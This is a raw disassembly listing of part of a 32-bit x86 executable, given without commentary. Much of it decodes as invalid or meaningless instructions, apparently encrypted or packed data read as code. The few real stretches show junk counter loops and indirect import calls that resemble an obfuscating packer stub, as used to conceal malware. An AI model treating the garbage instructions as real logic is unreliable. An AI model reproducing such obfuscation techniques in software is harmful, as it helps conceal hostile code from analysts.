  403064:	add    DWORD PTR [ebp+0x76],ecx
  403067:	or     DWORD PTR [eax+0x12],0xfffffff0
  40306b:	aas    
  40306c:	fsubr  DWORD PTR [ebp+0x31fae4e4]
  403072:	mov    edi,0x9b09fca6
  403077:	(bad)  
  403078:	cmp    DWORD PTR [edx+0x1f56ee07],esp
  40307e:	pop    ebp
  40307f:	xor    DWORD PTR [ebx+ebp*8+0x5f],0xffffffc3
  403084:	xchg   edi,eax
  403085:	aam    0xad
  403087:	mov    edi,0x9e7aaec6
  40308c:	inc    edx
  40308d:	test   DWORD PTR [ebp-0x3b],edx
  403090:	cmp    esi,esi
  403092:	push   esp
  403093:	xchg   DWORD PTR [ebp-0x309a0837],eax
  403099:	pusha  
  40309a:	pop    esp
  40309b:	in     al,dx
  40309c:	imul   edi,DWORD PTR [edi+0x5b58e773],0x831db8b8
  4030a6:	inc    edi
  4030a7:	mov    eax,0x796e3e42
  4030ac:	test   al,0x99
  4030ae:	push   ss
  4030af:	mov    ah,0xcc
  4030b1:	xor    al,al
  4030b3:	out    dx,eax
  4030b4:	push   ebp
  4030b5:	outs   dx,DWORD PTR ds:[esi]
  4030b6:	popf   
  4030b7:	cmc    
  4030b8:	out    0x2,eax
  4030ba:	adc    BYTE PTR [edi-0x53f182b],cl
  4030c0:	mov    edx,DWORD PTR [esi]
  4030c2:	bound  esp,QWORD PTR [edi+0xe89451e]
  4030c8:	mov    ecx,0x81347801
  4030cd:	ins    BYTE PTR es:[edi],dx
  4030ce:	retf   0x24d8
  4030d1:	pop    ecx
  4030d2:	sbb    eax,0xc3577571
  4030d7:	shl    BYTE PTR [ebx],0xc
  4030da:	xor    eax,0x4525a655
  4030df:	cmp    eax,0x9fc19cda
  4030e4:	aad    0xe6
  4030e6:	jmp    0x403080
  4030e8:	mov    bl,0xda
  4030ea:	imul   ecx,esi,0x83f34887
  4030f0:	stc    
  4030f1:	mov    ch,0x35
  4030f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4030f4:	jns    0x40315e
  4030f6:	ds (bad) {k2}
  4030fc:	scas   al,BYTE PTR es:[edi]
  4030fd:	ds cmc 
  4030ff:	mov    bl,0xd9
  403101:	mov    ebp,0x7b941798
  403106:	repnz cdq 
  403108:	fwait
  403109:	or     al,0xf4
  40310b:	push   si
  40310d:	pop    ecx
  40310e:	(bad)  
  40310f:	cmp    BYTE PTR [ecx],ch
  403111:	xor    al,0x75
  403113:	(bad)  
  403114:	sahf   
  403115:	aam    0xb3
  403117:	mov    ds:0xc5c4e0df,eax
  40311c:	jns    0x403185
  40311e:	loopne 0x403148
  403120:	cmp    bl,BYTE PTR [ecx]
  403122:	sub    esi,ebp
  403124:	sub    esi,DWORD PTR [edi]
  403126:	lods   eax,DWORD PTR ds:[esi]
  403127:	mov    ecx,0x15acefd0
  40312c:	js     0x40318c
  40312e:	fcmove st,st(5)
  403130:	jmp    0xd9cf5e50
  403135:	mov    edi,0x7d10052c
  40313a:	cld    
  40313b:	iret   
  40313c:	push   ebp
  40313d:	test   ebx,ecx
  40313f:	inc    esp
  403140:	and    esp,DWORD PTR [edx]
  403142:	push   ss
  403143:	xchg   esi,eax
  403144:	pop    ebp
  403145:	das    
  403146:	or     al,0x12
  403148:	data16 stc 
  40314a:	pop    ebx
  40314b:	cmp    dh,ch
  40314d:	fcom   QWORD PTR [eax+ebx*1-0x34]
  403151:	(bad)  
  403152:	xchg   edx,eax
  403153:	jmp    0x5de7adcb
  403158:	inc    eax
  403159:	clc    
  40315a:	repnz ins BYTE PTR es:[edi],dx
  40315c:	out    0x40,al
  40315e:	(bad)  
  40315f:	fwait
  403160:	mov    bl,0xd6
  403162:	inc    edi
  403163:	ds cdq 
  403165:	and    al,0x18
  403167:	test   al,0x5f
  403169:	push   ds
  40316a:	dec    esp
  40316b:	sbb    DWORD PTR [edi],ecx
  40316d:	scas   eax,DWORD PTR es:[edi]
  40316e:	mov    ds:0x3446dc34,eax
  403173:	int    0x23
  403175:	pop    ebp
  403176:	xor    al,ah
  403178:	stos   BYTE PTR es:[edi],al
  403179:	pop    ebp
  40317a:	popa   
  40317b:	int3   
  40317c:	cmp    ebx,DWORD PTR [esi]
  40317e:	out    0x73,al
  403180:	fwait
  403181:	mov    esi,0x41ec0761
  403186:	and    al,BYTE PTR [esi+0x60]
  403189:	jmp    0x9583:0xe33a7cc1
  403190:	push   edx
  403191:	mov    DWORD PTR [eax],ebx
  403193:	std    
  403194:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403195:	xor    ecx,DWORD PTR [edi-0x6d]
  403198:	push   ebp
  403199:	xor    BYTE PTR [ebx-0x68],dh
  40319c:	adc    BYTE PTR [ecx-0x1b4732ba],0xff
  4031a3:	popa   
  4031a4:	push   ds
  4031a5:	out    dx,al
  4031a6:	push   es
  4031a7:	mov    ah,0x74
  4031a9:	(bad)  
  4031aa:	outs   dx,DWORD PTR ds:[esi]
  4031ab:	jmp    0x4031ee
  4031ad:	js     0x4031be
  4031af:	inc    esi
  4031b0:	retf   0x5ccc
  4031b3:	push   ds
  4031b4:	adc    ebx,esi
  4031b6:	fnstcw WORD PTR [ebp*4-0x544d0d18]
  4031bd:	aas    
  4031be:	sbb    eax,0x4290510c
  4031c3:	outs   dx,DWORD PTR ds:[esi]
  4031c4:	adc    ecx,DWORD PTR [edi-0x9]
  4031c7:	lahf   
  4031c8:	clc    
  4031c9:	pushf  
  4031ca:	sub    dh,ah
  4031cc:	dec    ecx
  4031cd:	mov    eax,0xafb93652
  4031d2:	repnz in eax,0x83
  4031d5:	pop    edi
  4031d6:	arpl   WORD PTR [edx-0x14],sp
  4031d9:	in     eax,0x7a
  4031db:	ins    BYTE PTR es:[edi],dx
  4031dc:	(bad)  
  4031dd:	out    dx,eax
  4031de:	stos   DWORD PTR es:[edi],eax
  4031df:	or     DWORD PTR [edx],ebp
  4031e1:	push   ss
  4031e2:	sbb    bl,BYTE PTR [edx-0x72b4c135]
  4031e8:	retf   
  4031e9:	add    DWORD PTR [esi-0x7b509489],ebx
  4031ef:	push   ebp
  4031f0:	out    dx,al
  4031f1:	push   esp
  4031f2:	fnstcw WORD PTR [esi+0x7a]
  4031f5:	or     al,0x4c
  4031f7:	stos   BYTE PTR es:[edi],al
  4031f8:	sub    eax,0x150b0b3c
  4031fd:	mov    ?,esi
  4031ff:	mov    BYTE PTR [ecx+esi*4],cl
  403202:	add    BYTE PTR [ebp+eax*4-0x79],dl
  403206:	(bad)  
  403208:	mov    ebp,0x36291c55
  40320d:	jns    0x4031a7
  40320f:	sbb    BYTE PTR [eax+0x6f],al
  403212:	jns    0x403229
  403214:	bound  eax,QWORD PTR [ecx+0x76]
  403217:	hlt    
  403218:	sahf   
  403219:	pop    esi
  40321a:	inc    eax
  40321b:	or     ch,BYTE PTR [edx]
  40321d:	and    DWORD PTR [ebx-0x2],0xffffffb0
  403221:	es dec ebp
  403223:	sbb    al,0x0
  403225:	test   BYTE PTR [ebp-0x74],dh
  403228:	adc    al,0x71
  40322a:	cmp    bh,ah
  40322c:	fadd   QWORD PTR [ebp+0x21]
  40322f:	xchg   eax,edi
  403231:	outs   dx,DWORD PTR ds:[esi]
  403232:	retf   
  403233:	cld    
  403234:	mul    ebp
  403236:	push   edi
  403237:	pop    ss
  403238:	fcomp  DWORD PTR [ebx+edi*8-0x70]
  40323c:	add    al,0x66
  40323e:	ja     0x4031c2
  403240:	push   eax
  403241:	mov    ds:0x4a17b250,eax
  403246:	dec    eax
  403247:	xor    dh,BYTE PTR [esi+0x3b5e6461]
  40324d:	loop   0x4032bf
  40324f:	nop
  403250:	pop    eax
  403251:	or     esp,DWORD PTR [edi+0x27]
  403254:	arpl   WORD PTR [ecx],bx
  403256:	out    0x11,al
  403258:	repz sbb dl,BYTE PTR [eax+edi*4+0x4e]
  40325d:	mov    ds:0xc31a7e73,eax
  403262:	pop    ds
  403263:	jge    0x4032ab
  403265:	sbb    DWORD PTR [edi+0x8],esi
  403268:	dec    ecx
  403269:	xor    BYTE PTR [ecx],cl
  40326b:	scas   eax,DWORD PTR es:[edi]
  40326c:	aaa    
  40326d:	adc    BYTE PTR [ebp+0x6c],dl
  403270:	mov    ebx,0x88674ab0
  403275:	ret    0xb4ba
  403278:	jmp    0xd2ed4178
  40327d:	jnp    0x403209
  40327f:	repnz sbb ebx,DWORD PTR [ebx-0x37]
  403283:	ret    0xc
  403286:	push   ebp
  403287:	mov    ebp,esp
  403289:	sub    esp,0x14
  40328c:	leave  
  40328d:	ret    0x4
  403290:	push   ebp
  403291:	mov    ebp,esp
  403293:	push   ecx
  403294:	push   ecx
  403295:	neg    ecx
  403297:	mov    eax,0xf89c8535
  40329c:	and    DWORD PTR ds:0x433717,0x0
  4032a6:	mov    edx,DWORD PTR ds:0x433717
  4032ac:	inc    edx
  4032ad:	mov    DWORD PTR ds:0x433717,edx
  4032b3:	cmp    DWORD PTR ds:0x433717,0x6
  4032ba:	jne    0x4032d5
  4032c0:	push   0x8ffb
  4032c5:	push   0x6662
  4032ca:	push   0x4337ed
  4032cf:	call   DWORD PTR ds:0x412180
  4032d5:	cmp    DWORD PTR ds:0x433717,0x5
  4032dc:	jne    0x4032ef
  4032e2:	mov    edx,DWORD PTR ds:0x433717
  4032e8:	inc    edx
  4032e9:	mov    DWORD PTR ds:0x433717,edx
  4032ef:	cmp    DWORD PTR ds:0x433717,0x11
  4032f6:	jb     0x4032a6
  4032fc:	mov    DWORD PTR [ebp-0x8],eax
  4032ff:	sbb    DWORD PTR ds:0x43369b,edi
  403305:	mov    DWORD PTR [ebp-0x4],0xf89c8534
  40330c:	mov    DWORD PTR ds:0x43375b,0x7030
  403316:	mov    edx,DWORD PTR [ebp-0x8]
  403319:	and    DWORD PTR ds:0x4336f3,0x0
  403323:	xor    ecx,ecx
  403325:	or     ecx,DWORD PTR ds:0x4336f3
  40332b:	inc    ecx
  40332c:	mov    DWORD PTR ds:0x4336f3,ecx
  403332:	cmp    DWORD PTR ds:0x4336f3,0x1f
  403339:	jne    0x403361
  40333f:	push   0x433757
  403344:	push   0x433723
  403349:	push   DWORD PTR [ebp-0xc]
  40334c:	push   0x4338cc
  403351:	push   0x4337ca
  403356:	push   0x433867
  40335b:	call   DWORD PTR ds:0x412184
  403361:	cmp    DWORD PTR ds:0x4336f3,0x13
  403368:	jb     0x403323
  40336e:	mov    DWORD PTR ds:0x43365b,0x1f
  403378:	cmp    DWORD PTR ds:0x43365b,0x0
  40337f:	je     0x4033d1
  403385:	cmp    DWORD PTR ds:0x43365b,0x4
  40338c:	jne    0x40339d
  403392:	push   0x4336eb
  403397:	call   DWORD PTR ds:0x412188
  40339d:	cmp    DWORD PTR ds:0x43365b,0x5
  4033a4:	jne    0x4033b9
  4033aa:	xor    ecx,ecx
  4033ac:	xor    ecx,DWORD PTR ds:0x43365b
  4033b2:	dec    ecx
  4033b3:	mov    DWORD PTR ds:0x43365b,ecx
  4033b9:	mov    ecx,DWORD PTR ds:0x43365b
  4033bf:	dec    ecx
  4033c0:	mov    DWORD PTR ds:0x43365b,ecx
  4033c6:	jmp    0x403378
  4033cb:	and    DWORD PTR ds:0x4336e3,ecx
  4033d1:	push   esi
  4033d2:	mov    ecx,0x7510853
  4033d7:	xor    edx,ecx
  4033d9:	mov    esi,0x32729a
  4033de:	adc    DWORD PTR ds:0x43372b,0x4fea
  4033e8:	push   edi
  4033e9:	sub    DWORD PTR ds:0x4336db,0x417a
  4033f3:	mov    edi,DWORD PTR [ebp+0x10]
  4033f6:	add    edx,esi
  4033f8:	cmp    edi,edx
  4033fa:	je     0x403eaf
  403400:	jmp    0x40360c
  403405:	adc    DWORD PTR [edi+0x6fb6ef04],esp
  40340b:	icebp  
  40340c:	popa   
  40340d:	mov    WORD PTR [ebx],?
  40340f:	push   edi
  403410:	inc    esp
  403411:	pop    ebp
  403412:	dec    esi
  403413:	pop    edx
  403414:	jmp    0x40342c
  403416:	adc    edi,DWORD PTR [esp+edi*2+0x6d]
  40341a:	jg     0x403498
  40341c:	jl     0x403405
  40341e:	ret    
  40341f:	add    dl,0xab
  403422:	push   edi
  403423:	mov    cl,0x24
  403425:	pop    edx
  403426:	jmp    0xa9dd18f9
  40342b:	fstp   QWORD PTR [ecx+0x736b23c5]
  403431:	leave  
  403432:	shr    BYTE PTR [esi+ecx*8-0x48],cl
  403436:	mov    WORD PTR [ebp-0x5657caf8],ss
  40343c:	vsubss xmm3,xmm2,xmm7
  403440:	iret   
  403441:	idiv   DWORD PTR [eax-0x31b5f713]
  403447:	mov    eax,0xa0720bb1
  40344c:	xor    edi,DWORD PTR [edi]
  40344e:	inc    ebx
  40344f:	push   es
  403450:	adc    ch,BYTE PTR [edi+0x4e]
  403453:	push   edi
  403454:	add    DWORD PTR [ebp-0x416a228b],edx
  40345a:	fsubr  st,st(2)
  40345c:	lahf   
  40345d:	fwait
  40345e:	lahf   
  40345f:	ficom  DWORD PTR ds:0xb8627b4e
  403465:	adc    eax,0x5c
  403468:	mov    bl,BYTE PTR [esi+0x2cad75a7]
  40346e:	leave  
  40346f:	shl    BYTE PTR [esi+0x0],cl
  403472:	cmp    DWORD PTR [edx+esi*8-0xe],edx
  403476:	inc    edi
  403477:	inc    edx
  403478:	xor    al,0x1c
  40347a:	sar    DWORD PTR [ebp-0x53670ee3],cl
  403480:	pop    esi
  403481:	and    eax,0x47e65dd
  403486:	in     eax,dx
  403487:	and    al,0xe1
  403489:	inc    eax
  40348a:	dec    esp
  40348b:	scas   eax,DWORD PTR es:[edi]
  40348c:	out    0xac,eax
  40348e:	push   esi
  40348f:	or     ebx,DWORD PTR [esi-0x1c07f7bb]
  403495:	mov    esi,0xba553373
  40349b:	jae    0x4034b8
  40349d:	dec    ebx
  40349e:	aam    0xcf
  4034a0:	repz out dx,al
  4034a2:	add    bh,ch
  4034a4:	bound  ecx,QWORD PTR [esi+0x3c]
  4034a7:	call   0x407bdd20
  4034ac:	scas   eax,DWORD PTR es:[edi]
  4034ad:	shr    BYTE PTR ss:[edi+0x469b532],cl
  4034b4:	shl    bl,cl
  4034b6:	fldlg2 
  4034b8:	push   esp
  4034b9:	cmp    ebp,DWORD PTR [esi+0x39]
  4034bc:	lea    esi,[edx+0x3f]
  4034bf:	stos   DWORD PTR es:[edi],eax
  4034c0:	inc    ebx
  4034c1:	ret    
  4034c2:	lea    ecx,[eax+0x21dbcd7b]
  4034c8:	sbb    DWORD PTR [edi+0x14],0xffffffe4
  4034cc:	or     al,0xac
  4034ce:	jo     0x40352e
  4034d0:	jae    0x40347c
  4034d2:	push   cs
  4034d3:	pop    es
  4034d4:	pop    ecx
  4034d5:	loopne 0x4034f2
  4034d7:	jp     0x4034d1
  4034d9:	and    dh,dh
  4034db:	pop    edx
  4034dc:	or     DWORD PTR [esi+edx*8],eax
  4034df:	int    0xf8
  4034e1:	int    0x33
  4034e3:	(bad)  
  4034e4:	fisub  DWORD PTR [ecx-0x1c968afb]
  4034ea:	(bad)  
  4034eb:	xchg   ebx,eax
  4034ec:	loopne 0x403541
  4034ee:	lahf   
  4034ef:	imul   esp,DWORD PTR [edx-0x69b195b0],0x64407ed8
  4034f9:	sbb    al,0x5a
  4034fb:	cwde   
  4034fc:	pop    ecx
  4034fd:	add    ah,BYTE PTR [eax-0xd335378]
  403503:	mov    ebp,0xde4c77d
  403508:	repnz das 
  40350a:	mov    bh,0xbf
  40350c:	mov    esp,0x6bc006ae
  403511:	pop    edi
  403512:	mov    DWORD PTR ds:0xc83ffde6,ecx
  403518:	inc    eax
  403519:	pop    esi
  40351a:	add    bl,bl
  40351c:	push   cs
  40351d:	sub    dh,BYTE PTR [ebp+0x7]
  403520:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403522:	push   ds
  403523:	cwde   
  403524:	das    
  403525:	mov    ch,0x77
  403527:	and    eax,0x8bc2e73b
  40352c:	jb     0x403578
  40352e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40352f:	imul   BYTE PTR [ecx+esi*1+0x3b]
  403533:	dec    edi
  403534:	stc    
  403535:	xlat   BYTE PTR ds:[ebx]
  403536:	shr    BYTE PTR [ecx],0xe4
  403539:	nop
  40353a:	pop    ebx
  40353b:	sbb    BYTE PTR [edx-0x4c],cl
  40353e:	mov    edx,0x75c8ec79
  403543:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403544:	cmp    dh,ch
  403546:	and    eax,0xc5746293
  40354b:	jne    0x4035ae
  40354d:	mov    WORD PTR [edi+edi*4+0x24],ds
  403551:	xor    dh,BYTE PTR [esp+ebp*2-0x53]
  403555:	mov    ds:0xb818b7ee,eax
  40355a:	and    al,bl
  40355c:	inc    edx
  40355d:	in     eax,dx
  40355e:	adc    BYTE PTR [ecx+0xd],bh
  403561:	sub    al,0x2
  403563:	xchg   ebx,eax
  403564:	aad    0x15
  403566:	and    al,0xcb
  403568:	stos   DWORD PTR es:[edi],eax
  403569:	or     ebx,edx
  40356b:	inc    esp
  40356c:	and    DWORD PTR [ecx-0x2f],edx
  40356f:	xor    esp,esp
  403571:	pop    eax
  403572:	adc    DWORD PTR [eax-0x7c640792],ecx
  403578:	retf   0x54b
  40357b:	inc    ebp
  40357c:	js     0x403552
  40357e:	dec    esi
  403580:	xor    bh,BYTE PTR [eax-0x1df6c8cc]
  403586:	jmp    0xcc48fcd6
  40358b:	out    dx,eax
  40358c:	(bad)
  403590:	out    dx,al
  403591:	int3   
  403592:	add    eax,0x8e4f612
  403597:	add    ecx,edx
  403599:	arpl   WORD PTR [esi+0x32],sp
  40359c:	xor    ch,dh
  40359e:	add    al,0x5f
  4035a0:	or     eax,0x52aa6e8d
  4035a5:	push   ss
  4035a6:	push   ss
  4035a7:	lea    eax,[ecx+eax*1-0x35a9e06e]
  4035ae:	test   bl,dh
  4035b0:	std    
  4035b1:	test   BYTE PTR [ecx+0x54],ch
  4035b4:	(bad)  
  4035b5:	cmp    al,0x6e
  4035b7:	les    esp,FWORD PTR [ecx]
  4035b9:	jl     0x4035b5
  4035bb:	mov    ah,0x42
  4035bd:	int3   
  4035be:	mov    al,ds:0x3608ce5c
  4035c3:	sbb    BYTE PTR [ecx+0x3bd77296],0x3e
  4035ca:	fs and al,0xec
  4035cd:	ret    
  4035ce:	sub    bh,BYTE PTR [edi]
  4035d0:	iret   
  4035d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4035d2:	(bad)
  4035d6:	ins    DWORD PTR es:[edi],dx
  4035d7:	sbb    eax,DWORD PTR [eax]
  4035d9:	xchg   ebp,eax
  4035da:	sbb    eax,0x29d73281
  4035df:	fsubr  DWORD PTR [ecx]
  4035e1:	dec    ebx
  4035e2:	inc    ecx
  4035e3:	inc    edi
  4035e4:	cli    
  4035e5:	ds loop 0x4035f3
  4035e8:	into   
  4035e9:	sbb    ecx,ebp
  4035eb:	add    DWORD PTR [edx+esi*4+0x7f],eax
  4035ef:	pop    esi
  4035f0:	add    DWORD PTR [edx+0x7d],0xffffffe0
  4035f4:	mov    ah,0x3b
  4035f6:	aas    
  4035f7:	ja     0x4035d6
  4035f9:	adc    al,0xd6
  4035fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4035fc:	sbb    al,0x95
  4035fe:	and    cl,BYTE PTR [edx+0x179dc28]
  403604:	(bad)  
  403605:	shl    BYTE PTR ds:0x7ff60b00,0x8b
  40360c:	mov    edx,DWORD PTR [ebp-0x8]
  40360f:	mov    eax,DWORD PTR [ebp-0x4]
  403612:	xor    eax,ecx
  403614:	mov    edi,0xffcd8d66
  403619:	sub    edi,eax
  40361b:	add    edi,DWORD PTR [ebp+0x10]
  40361e:	xor    edx,ecx
  403620:	add    edx,esi
  403622:	cmp    edx,edi
  403624:	ja     0x403eaa
  40362a:	push   ebx
  40362b:	jmp    0x403841
  403630:	mov    esi,0x32729a
  403635:	jmp    0x403841
  40363a:	sbb    dh,BYTE PTR [eax+ebx*8+0x727272b6]
  403641:	mov    al,0x9c
  403643:	outs   dx,DWORD PTR ds:[esi]
  403644:	call   0x7aef876
  403649:	pop    ebp
  40364a:	pop    es
  40364b:	sbb    eax,0x7f6d7c7c
  403650:	jl     0x4036ce
  403652:	xchg   ebx,eax
  403653:	push   edi
  403654:	(bad)  
  403655:	pop    ss
  403656:	loopne 0x403687
  403658:	mov    al,0xe8
  40365a:	push   eax
  40365b:	xlat   BYTE PTR ds:[ebx]
  40365c:	jbe    0x403643
  40365e:	rcl    BYTE PTR [edx],0xa9
  403661:	add    bh,0xfb
  403664:	push   ds
  403665:	cwde   
  403666:	addr16 jmp 0x17a7:0x95316175
  40366e:	xchg   esp,eax
  40366f:	jne    0x403638
  403671:	stos   BYTE PTR es:[di],al
  403673:	push   ss
  403674:	jecxz  0x40360b
  403676:	sub    BYTE PTR [ecx-0x5028ed8f],ah
  40367c:	push   0xffffffb2
  40367e:	push   0x4c
  403680:	mov    eax,ds:0xc6f54b22
  403685:	xchg   ebp,eax
  403686:	fstp   QWORD PTR [edx-0x60]
  403689:	inc    ebx
  40368a:	jbe    0x4036e8
  40368c:	jl     0x403618
  40368e:	stos   DWORD PTR es:[edi],eax
  40368f:	pop    esp
  403690:	or     cl,BYTE PTR ds:[ecx+0xb973fac]
  403697:	pop    edx
  403698:	lds    esp,FWORD PTR [ecx+0x62e40903]
  40369e:	push   ss
  40369f:	and    al,0x95
  4036a1:	adc    DWORD PTR [edx-0x4eb20c14],esp
  4036a7:	inc    esi
  4036a8:	sub    al,0xd8
  4036aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4036ab:	ds dec esi
  4036ad:	mov    bl,0x89
  4036af:	cmp    al,dh
  4036b1:	xchg   ecx,eax
  4036b2:	adc    esi,DWORD PTR [edi+0x20f36b2e]
  4036b8:	mov    bl,0x4c
  4036ba:	ins    DWORD PTR es:[edi],dx
  4036bb:	jmp    DWORD PTR [esi+0x77e4986e]
  4036c1:	sbb    BYTE PTR [ecx],0xa8
  4036c4:	scas   eax,DWORD PTR es:[edi]
  4036c5:	xchg   edx,eax
  4036c6:	mov    DWORD PTR [ecx],edi
  4036c8:	ror    BYTE PTR [ebp-0x7845aaab],cl
  4036ce:	sbb    eax,DWORD PTR [ecx+eax*1]
  4036d1:	ret    0x8961
  4036d4:	das    
  4036d5:	sbb    al,dl
  4036d7:	xchg   BYTE PTR [ebp-0x690a8683],bl
  4036dd:	mov    al,0xd4
  4036df:	push   eax
  4036e0:	push   esi
  4036e1:	int3   
  4036e2:	lock nop
  4036e4:	cdq    
  4036e5:	in     eax,0x7d
  4036e7:	lods   al,BYTE PTR ds:[esi]
  4036e8:	pop    es
  4036e9:	mov    al,ds:0x1d4e7bb3
  4036ee:	shr    DWORD PTR [esi-0x15],1
  4036f1:	cld    
  4036f2:	dec    esi
  4036f3:	pop    eax
  4036f4:	mov    dh,0x69
  4036f6:	pop    eax
  4036f7:	rcr    BYTE PTR [edx-0x2b],0xbd
  4036fb:	ds xor ecx,esi
  4036fe:	jmp    0x354c:0xe70ef38f
  403705:	mov    dh,0xc7
  403707:	mov    eax,ds:0x8735bc2d
  40370c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40370d:	adc    DWORD PTR [ecx-0x69],ebp
  403710:	xchg   ebp,eax
  403711:	jecxz  0x40372c
  403713:	outs   dx,BYTE PTR ds:[esi]
  403714:	addr16 xchg esi,eax
  403716:	inc    ebx
  403717:	or     DWORD PTR ds:0xaabc6778,ebx
  40371d:	mov    ch,0xb3
  40371f:	nop
  403720:	retf   
  403721:	fs jg  0x4036e3
  403724:	rcl    DWORD PTR [edi+0x4d],0xe1
  403728:	cwde   
  403729:	and    edx,ebx
  40372b:	popf   
  40372c:	out    0xaa,al
  40372e:	popf   
  40372f:	mov    al,0x63
  403731:	dec    ecx
  403732:	in     al,dx
  403733:	int3   
  403734:	fld    QWORD PTR [edx+edx*8]
  403737:	ins    DWORD PTR es:[edi],dx
  403738:	mov    bh,0x18
  40373a:	mov    ebx,0x731a98c4
  40373f:	rcr    BYTE PTR [ebx+0x11],1
  403742:	jmp    0xa7e9:0x43beface
  403749:	xor    BYTE PTR [edi+0x2b],ch
  40374c:	dec    edi
  40374d:	push   0x5ccb3f6
  403752:	sbb    esi,DWORD PTR [bp+si]
  403755:	retf   0xf890
  403758:	pop    ds
  403759:	xchg   ebx,eax
  40375a:	ja     0x4037a7
  40375c:	dec    ebx
  40375d:	shl    DWORD PTR [ebp-0xf],cl
  403760:	pop    esp
  403761:	aaa    
  403762:	mov    eax,0xb6eeb94e
  403767:	cmp    eax,0x8d9e629b
  40376c:	mov    fs,WORD PTR [eax+0x215657d7]
  403772:	out    0x37,eax
  403774:	lahf   
  403775:	add    ebx,DWORD PTR [ecx-0xf]
  403778:	mov    ah,0xad
  40377a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40377b:	in     al,0x28
  40377d:	imul   ebx,ecx,0x1df9e2d9
  403783:	loop   0x403764
  403785:	mov    al,ds:0xd9d1cbbc
  40378a:	sub    ah,BYTE PTR [eax]
  40378c:	inc    edi
  40378d:	pushf  
  40378e:	fidivr DWORD PTR [edx+0x56329f96]
  403794:	shr    BYTE PTR [eax],cl
  403796:	xchg   ebp,eax
  403797:	cli    
  403798:	pop    esi
  403799:	ins    DWORD PTR es:[edi],dx
  40379a:	popf   
  40379b:	repz push ds
  40379d:	jno    0x403813
  40379f:	inc    edi
  4037a0:	into   
  4037a1:	sub    BYTE PTR [ebx-0x72],dh
  4037a4:	cmp    al,0xba
  4037a6:	loopne 0x403826
  4037a8:	shr    DWORD PTR [ecx+0x31],1
  4037ab:	retf   
  4037ac:	dec    ecx
  4037ad:	xor    ah,BYTE PTR [edi]
  4037af:	mov    DWORD PTR [esi+ebp*4-0x37],esp
  4037b3:	(bad)  
  4037b4:	mov    al,ds:0x80f3357f
  4037b9:	dec    edx
  4037ba:	loope  0x403836
  4037bc:	or     ah,BYTE PTR fs:[ebp+eiz*8-0x33be0ad2]
  4037c4:	push   cs
  4037c5:	jo     0x4037c0
  4037c7:	shr    BYTE PTR [ebp+0x2a],cl
  4037ca:	mov    al,ds:0xa740c756
  4037cf:	sub    esp,DWORD PTR ds:0x958e7a21
  4037d5:	pop    eax
  4037d6:	mov    ecx,0x28b3b97c
  4037db:	push   0xd192099e
  4037e0:	add    DWORD PTR [edx-0xf95b230],eax
  4037e6:	push   cs
  4037e7:	leave  
  4037e8:	call   0x8a3a28d1
  4037ed:	lock in al,0x83
  4037f0:	ds hlt 
  4037f2:	jecxz  0x403871
  4037f4:	push   edx
  4037f5:	xchg   ecx,eax
  4037f6:	jns    0x40385d
  4037f8:	into   
  4037f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4037fa:	or     al,0xb1
  4037fc:	inc    edi
  4037fd:	pop    esi
  4037fe:	sbb    al,0xd7
  403800:	hlt    
  403801:	sub    al,BYTE PTR [esi+esi*4+0x34]
  403805:	xor    bl,dl
  403807:	jno    0x4037e3
  403809:	int    0xad
  40380b:	mov    ch,0x6c
  40380d:	clc    
  40380e:	loopne 0x403883
  403810:	pusha  
  403811:	retf   0x8754
  403814:	dec    esi
  403815:	dec    esp
  403816:	push   cs
  403817:	inc    eax
  403818:	fistp  DWORD PTR [eax-0x1a5a9918]
  40381e:	sub    ecx,ebx
  403820:	or     DWORD PTR [ebx-0x74bf0b6],0xffffffd7
  403827:	jp     0x40383b
  403829:	ror    ecx,0x58
  40382c:	test   DWORD PTR ds:0xb2fc79c7,esi
  403832:	shl    DWORD PTR [ebx],cl
  403834:	mov    bl,0x4a
  403836:	aam    0x5a
  403838:	ficomp DWORD PTR [ebp+0x39]
  40383b:	inc    esp
  40383c:	sbb    ecx,edi
  40383e:	call   0x45cc326c
  403843:	clc    
  403844:	jmp    0x403a50
  403849:	sar    BYTE PTR [esi+0x5d5dd03b],1
  40384f:	sar    DWORD PTR [esi+0x4bfdbe82],cl
  403855:	outs   dx,BYTE PTR ds:[esi]
  403856:	mov    ds:0x1c7485dc,eax
  40385b:	jl     0x4038d9
  40385d:	ins    DWORD PTR es:[edi],dx
  40385e:	jg     0x4038dc
  403860:	jl     0x403880
  403862:	leave  
  403863:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403864:	fisttp DWORD PTR [ecx-0x482a176d]
  40386a:	mov    cl,0x74
  40386c:	push   ss
  40386d:	sbb    bl,BYTE PTR [edi-0xb94c648]
  403873:	xor    eax,0xfc1f5090
  403878:	lds    eax,FWORD PTR [edx+0x1cd7e7e8]
  40387e:	cmp    BYTE PTR [ebx-0x5ab0e7d7],bh
  403884:	jmp    0x4038d8
  403886:	jno    0x40384d
  403888:	and    al,0x51
  40388a:	fdivp  st(0),st
  40388c:	fnstenv [ebx]
  40388e:	int    0xfa
  403890:	and    DWORD PTR [edx],esp
  403892:	adc    al,0x89
  403894:	sub    al,0x79
  403896:	mov    ebx,0xd3d44e6f
  40389b:	mov    ebp,0x36662e4
  4038a0:	imul   edx,ebx,0x58
  4038a3:	mov    esp,0x935ce1a2
  4038a8:	ins    BYTE PTR es:[edi],dx
  4038a9:	push   esp
  4038aa:	pushf  
  4038ab:	ins    DWORD PTR es:[edi],dx
  4038ac:	shr    DWORD PTR [ecx],cl
  4038ae:	push   ecx
  4038af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4038b0:	mov    edx,0x55cb5b7b
  4038b5:	stos   DWORD PTR es:[edi],eax
  4038b6:	jge    0x4038bf
  4038b8:	div    DWORD PTR [eax]
  4038ba:	(bad)  
  4038bb:	icebp  
  4038bc:	sub    edx,DWORD PTR [esi+0x1db1aed4]
  4038c2:	mov    eax,0x5fe40481
  4038c7:	pop    ebx
